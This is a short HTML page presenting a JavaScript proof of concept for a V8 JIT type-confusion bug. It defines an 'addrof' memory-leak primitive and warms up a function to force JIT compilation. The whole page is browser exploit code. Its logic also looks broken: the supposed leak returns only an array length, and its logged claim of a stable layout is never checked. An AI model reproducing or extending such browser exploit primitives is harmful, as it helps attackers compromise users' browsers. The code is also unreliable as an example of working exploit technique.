<!DOCTYPE html>
<html>
<head><title>V8 Confusion PoC</title></head>
<body>
<pre id="log"></pre>
<script>
const log = x => document.getElementById("log").textContent += x + "\n";

function addrof(obj) {
  let a = [1.1, 1.2, 1.3];
  let o = {x: obj};
  let b = [o];

  function opt(a1, a2) {
    let tmp = a1.length;
    a1[0] = 13.37;
    a2[0] = {};
    return tmp;
  }

  for (let i = 0; i < 10000; i++) opt(a, b); // JIT it

  let leak = opt(a, b);
  log("Finished leak test. Possibly stable layout.");
  return leak;
}

let result = addrof({foo: 1337});
log("Leak result: " + result);
</script>
</body>
</html>
